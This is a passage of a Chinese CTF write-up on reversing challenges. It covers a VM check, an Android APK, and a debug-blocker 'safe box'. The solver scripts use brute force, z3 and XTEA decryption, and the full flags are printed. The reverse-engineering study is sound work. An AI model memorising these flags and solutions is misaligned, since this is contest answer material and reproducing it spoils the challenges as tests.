class="number">0xb1</span>,<span class="number">0xb2</span>]</span><br><span class="line">table=&#123;<span class="number">0xb1</span>:<span class="number">0x7b</span>,<span class="number">0xb2</span>:<span class="number">0x2f</span>,<span class="number">0xb3</span>:<span class="number">0x37</span>,<span class="number">0xb4</span>:<span class="number">0xe8</span>&#125;</span><br><span class="line"></span><br><span class="line">xor=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">  xor.append(table[i])</span><br><span class="line">print(xor)</span><br><span class="line">enc=[<span class="number">0x4a</span>,<span class="number">0x19</span>,<span class="number">0xdd</span>,<span class="number">0xf</span>,<span class="number">0x1b</span>,<span class="number">0x89</span>,<span class="number">0x19</span>,<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x4e</span>,<span class="number">0x55</span>,<span class="number">0x56</span>,<span class="number">0x8e</span>,<span class="number">0x49</span>,<span class="number">0xe</span>,<span class="number">0x4b</span>,<span class="number">0x6</span>,<span class="number">0x54</span>,<span class="number">0x1a</span>,<span class="number">0x42</span>,<span class="number">0x53</span>,<span class="number">0x1f</span>,<span class="number">0x52</span>,<span class="number">0xdb</span>,<span class="number">0x19</span>,<span class="number">0xd9</span>,<span class="number">0x19</span>,<span class="number">0x55</span>,<span class="number">0x19</span>,<span class="number">0x0</span>,<span class="number">0x4b</span>,<span class="number">0x1e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">  print(<span class="built_in">chr</span>(enc[i]^xor[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#16584abc45baff901c59dde3b1bb6701</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后4个字符逻辑如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">table[1] &#x3D; flag[32];</span><br><span class="line">table[2] &#x3D; 0x18</span><br><span class="line">table[1] &lt;&lt;&#x3D; table[2];</span><br><span class="line">table[9] &#x3D; table[1];</span><br><span class="line">table[1] &#x3D; flag[33];</span><br><span class="line">table[2] &#x3D; 0x10</span><br><span class="line">table[1] &lt;&lt;&#x3D; table[2];</span><br><span class="line">table[9] +&#x3D; table[1];</span><br><span class="line">table[1] &#x3D; flag[34];</span><br><span class="line">table[2] &#x3D; 0x8</span><br><span class="line">table[1] &lt;&lt;&#x3D; table[2];</span><br><span class="line">table[9] +&#x3D; table[1];</span><br><span class="line">table[1] &#x3D; flag[35];</span><br><span class="line">table[9] +&#x3D; table[1];</span><br><span class="line">table[1] &#x3D; table[9];</span><br><span class="line">table[2] &#x3D; 0x5</span><br><span class="line">table[1] &gt;&gt;&#x3D; table[2];</span><br><span class="line">table[1] ^&#x3D; table[9];</span><br><span class="line">table[9] &#x3D; table[1];</span><br><span class="line">table[2] &#x3D; 0x7</span><br><span class="line">table[1] &lt;&lt;&#x3D; table[2];</span><br><span class="line">table[2] &#x3D; 0x98f17723</span><br><span class="line">table[1] &amp;&#x3D; table[2];</span><br><span class="line">table[1] ^&#x3D; table[9];</span><br><span class="line">table[9] &#x3D; table[1];</span><br><span class="line">table[2] &#x3D; 0x18</span><br><span class="line">table[1] &lt;&lt;&#x3D; table[2];</span><br><span class="line">table[2] &#x3D; 0x35e4b920</span><br><span class="line">table[1] &amp;&#x3D; table[2];</span><br><span class="line">table[1] ^&#x3D; table[9];</span><br><span class="line">table[9] &#x3D; table[1];</span><br><span class="line">table[2] &#x3D; 0x12</span><br><span class="line">table[1] &gt;&gt;&#x3D; table[2];</span><br><span class="line">table[1] ^&#x3D; table[9];</span><br><span class="line">if ( table[1] !&#x3D; 1877735783 )</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>需要特别注意的是里面的0x80对应的指令，比赛时就是在这花了很多时间，还好一步步调，最后找到了。<br><img src="https://i.loli.net/2021/09/14/QYOSXg5UcmuNHf9.png"><br>解法可以考虑爆破，4个字符，也不是很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">      <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        table=[<span class="number">0</span>]*<span class="number">10</span></span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(a)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x18</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] =<span class="built_in">ord</span>(b)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x10</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] += table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(c)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x8</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] += table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(d)</span><br><span class="line">        table[<span class="number">9</span>] = (table[<span class="number">9</span>]+table[<span class="number">1</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        table[<span class="number">1</span>] = table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x5</span></span><br><span class="line">        table[<span class="number">1</span>] &gt;&gt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x7</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x98f17723</span></span><br><span class="line">        table[<span class="number">1</span>] &amp;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x18</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x35e4b920</span></span><br><span class="line">        table[<span class="number">1</span>] &amp;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x12</span></span><br><span class="line">        table[<span class="number">1</span>] &gt;&gt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        <span class="keyword">if</span>(table[<span class="number">1</span>]&amp;<span class="number">0xffffffff</span>==<span class="number">1877735783</span>):</span><br><span class="line">          print(a,b,c,d)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line"><span class="comment">#a 2 5 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后面8个字符，加密过程也有坑，就是*和&lt;&lt;会产生溢出。也是考虑爆破解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">      <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        table=[<span class="number">0</span>]*<span class="number">10</span></span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(a)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x18</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] =<span class="built_in">ord</span>(b)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x10</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] += table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(c)</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x8</span></span><br><span class="line">        table[<span class="number">1</span>] &lt;&lt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">9</span>] += table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = <span class="built_in">ord</span>(d)</span><br><span class="line">        table[<span class="number">9</span>] += table[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        table[<span class="number">1</span>] = table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">3</span>] = <span class="number">0x20</span></span><br><span class="line">        table[<span class="number">1</span>] = (table[<span class="number">1</span>] *table[<span class="number">3</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">        table[<span class="number">4</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x11</span></span><br><span class="line">        table[<span class="number">1</span>] &gt;&gt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">5</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = table[<span class="number">5</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">4</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0xd</span></span><br><span class="line">        table[<span class="number">1</span>]= (table[<span class="number">1</span>] &lt;&lt;table[<span class="number">2</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">4</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">5</span>]</span><br><span class="line">        table[<span class="number">9</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">3</span>] = <span class="number">0x20</span></span><br><span class="line">        table[<span class="number">1</span>] = (table[<span class="number">1</span>] *table[<span class="number">3</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">        table[<span class="number">4</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0x11</span></span><br><span class="line">        table[<span class="number">1</span>] &gt;&gt;= table[<span class="number">2</span>]</span><br><span class="line">        table[<span class="number">5</span>] = table[<span class="number">1</span>]</span><br><span class="line">        table[<span class="number">1</span>] = table[<span class="number">5</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">4</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">2</span>] = <span class="number">0xd</span></span><br><span class="line">        table[<span class="number">1</span>] =(table[<span class="number">1</span>] &lt;&lt;table[<span class="number">2</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">9</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">4</span>]</span><br><span class="line">        table[<span class="number">1</span>] ^= table[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(table[<span class="number">1</span>]&amp;<span class="number">0xffffffff</span>==<span class="number">0x283B8E84</span>):</span><br><span class="line">          print(a,b,c,d)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># table[1] = table[9]</span></span><br><span class="line">        <span class="comment"># table[3] = 0x20</span></span><br><span class="line">        <span class="comment"># table[1] *= table[3]</span></span><br><span class="line">        <span class="comment"># table[4] = table[1]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[2] = 0x11</span></span><br><span class="line">        <span class="comment"># table[1] &gt;&gt;= table[2]</span></span><br><span class="line">        <span class="comment"># table[5] = table[1]</span></span><br><span class="line">        <span class="comment"># table[1] = table[5]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[4]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[2] = 0xd</span></span><br><span class="line">        <span class="comment"># table[1] &lt;&lt;= table[2]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[4]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[5]</span></span><br><span class="line">        <span class="comment"># table[9] = table[1]</span></span><br><span class="line">        <span class="comment"># table[3] = 0x20</span></span><br><span class="line">        <span class="comment"># table[1] *= table[3]</span></span><br><span class="line">        <span class="comment"># table[4] = table[1]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[2] = 0x11</span></span><br><span class="line">        <span class="comment"># table[1] &gt;&gt;= table[2]</span></span><br><span class="line">        <span class="comment"># table[5] = table[1]</span></span><br><span class="line">        <span class="comment"># table[1] = table[5]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[4]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[2] = 0xd</span></span><br><span class="line">        <span class="comment"># table[1] &lt;&lt;= table[2]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[9]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[4]</span></span><br><span class="line">        <span class="comment"># table[1] ^= table[5]</span></span><br><span class="line"><span class="comment">#b06c dc23   </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到SangFor{16584abc45baff901c59dde3b1bb6701a254b06cdc23}</p><h2 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h2><p>对apk的分析确实比较少，有点可惜，当时不知道为什么md5去网上解，没解出来，看来得多用几个网站。</p><p>拖到jeb看流程。<br><img src="https://i.loli.net/2021/09/14/tD21fTKedhR9awq.png"><br>去看md5解密，现在网站解密又可以解出来了。。。654321<br><img src="https://i.loli.net/2021/09/14/5FAKMmC4hGlgasQ.png"><br>看看key怎么生成的<br><img src="https://i.loli.net/2021/09/14/5ICAoDdKOkxWRzN.png"><br>得到key<br><img src="https://i.loli.net/2021/09/14/3JjDQedOlAT5qBn.png"><br>去看加密encode函数。<br><img src="https://i.loli.net/2021/09/14/XJfonBLK46NprS1.png"></p><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc_md5 = <span class="built_in">bytearray</span>.fromhex(<span class="string">&#x27;c232666f1410b3f5010dc51cec341f58&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_md5:</span><br><span class="line">  print(<span class="built_in">hex</span>(i+<span class="number">1</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">t=<span class="string">&#x27;3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom &#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    ans += base1[base.index(i)]</span><br><span class="line">print(ans)</span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"><span class="comment">#c33367701511b4f62ec61ded352059</span></span><br><span class="line"><span class="comment">#SangFor&#123;212f4548-03d1-11ec-ab68-00155db3a27e&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="safe-box"><a href="#safe-box" class="headerlink" title="safe box"></a>safe box</h2><p>Debug Blocker，这种技术还可以用来hookAPI，还是挺有意思，逆向工程核心原理中也有讲解，之前mrctf也遇到过，流程分析起还是不难，就是解的时候总是各种细节问题。。。。，后面看了师傅的wp来看看出现的问题。</p><p>浏览过整体框架可以知道，需要输入3个password。</p><p>先看看第一个，太大了 爆出来要等太久，用z3确实会快很多。<br><img src="https://i.loli.net/2021/09/14/l7GRN8envTAUoJk.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">Seed = BitVec(<span class="string">&#x27;passwd&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v2 = (Seed % <span class="number">0x2540BE3FF</span>)&amp;<span class="number">0xff</span></span><br><span class="line">v3 = ((Seed % <span class="number">0x2540BE3FF</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span></span><br><span class="line">v4 = ((Seed % <span class="number">0x2540BE3FF</span>) &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFF</span></span><br><span class="line">v5 = v2 + <span class="number">1</span></span><br><span class="line">v6 = ((Seed % <span class="number">0x2540BE3FF</span>) &gt;&gt; <span class="number">12</span>)&amp;<span class="number">0xff</span></span><br><span class="line">v7 = v3 + <span class="number">1</span></span><br><span class="line">v8 = v4 + ~v2</span><br><span class="line">v9 = v4</span><br><span class="line">v10 = <span class="number">21</span> * v6</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  v3 += v3 ^ v8</span><br><span class="line">  v2 += v4 | v2 &amp; v7</span><br><span class="line">  v9 += (v10 + v9) % v5</span><br><span class="line">  v6 += v6 / v7</span><br><span class="line"></span><br><span class="line">s.add(v3 == <span class="number">0x38006F1</span>)</span><br><span class="line">s.add(v2 == <span class="number">0x7291</span>)</span><br><span class="line">s.add(v9 == <span class="number">0x8B3</span>)</span><br><span class="line">s.add(v6 == <span class="number">0x80</span>)</span><br><span class="line">s.add(Seed &gt; <span class="number">0</span>, Seed &lt;= <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">  print(s.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">&#x27;Not Found!&#x27;</span>)</span><br><span class="line"><span class="comment">#0x72335f31</span></span><br><span class="line"><span class="comment">#r3_1</span></span><br></pre></td></tr></table></figure><p>输入完password1后就会触发一个int3异常，动调看看，注意main函数中的IsDebuggerPresent()，断点打在sub_140001270()中，也就是程序自己的异常处理函数。<br><img src="https://i.loli.net/2021/09/14/rUSxcf2gFjdXk64.png"><br>然后去新exe查看该函数，0014000187F处p键<br><img src="https://i.loli.net/2021/09/14/QnMykxJeH4Rsrbz.png"><br>所以password2就是10个字符分5组进行xtea加密，xtea解密如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,i,delta=<span class="number">0x12345678</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum=delta*<span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        v1-=( ((v0&lt;&lt;<span class="number">5</span>) ^(v0&gt;&gt;<span class="number">6</span>)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span> ]);</span><br><span class="line">        sum-=delta;</span><br><span class="line">        v0-=( ((v1&lt;&lt;<span class="number">5</span>) ^ (v1&gt;&gt;<span class="number">6</span>)) +v1 ) ^ ( sum + key[sum&amp;<span class="number">3</span>] );</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,code[<span class="number">0</span>],code[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0x47</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x54</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">10</span>]=&#123;<span class="number">0x36C128C5</span>, <span class="number">0x0C4799A63</span>, <span class="number">0x0E8013E6C</span>, <span class="number">0x0A9F49003</span>, <span class="number">0x607EF54A</span>,<span class="number">0x542C2DDF</span>, <span class="number">0x558BD01C</span>, <span class="number">0x65512CA2</span>, <span class="number">0x0BE1E3D05</span>, <span class="number">0x3C467DAD</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    decrypt(<span class="number">32</span>,&amp;code[i*<span class="number">2</span>],key);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//S_s0_fuNny </span></span><br></pre></td></tr></table></figure><p>password3，引发异常，伪随机数。<br><img 